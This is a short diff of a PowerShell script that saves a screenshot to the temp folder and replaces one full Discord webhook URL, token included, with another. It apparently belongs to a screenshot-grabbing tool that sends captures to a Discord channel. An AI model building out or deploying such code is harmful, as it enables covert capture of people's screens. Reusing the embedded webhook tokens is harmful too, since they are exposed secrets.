@@ -3,7 +3,7 @@ $tempDir = [System.IO.Path]::GetTempPath()
 $screenshotPath = [System.IO.Path]::Combine($tempDir, "screenshot.png")
 
 # Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1261624986091651092/yA0b1q3fL5w2210CHVnRNDI82qvlmQTfRJDol73SWr1TyXdF7kdSWsijlEVr2xO9pcoV"
+$webhookUrl = "https://discord.com/api/webhooks/1266038774689828966/1N__Dh0qQYEUM7GZ1wrdJ7tbahxGp1MI2IxGQuXsRAWI_9zeyLkbRWcCXBGT6o3sLiiF"
 
 # Import the screenshot module
 if (Test-Path .\Take-Screenshot.ps1) {
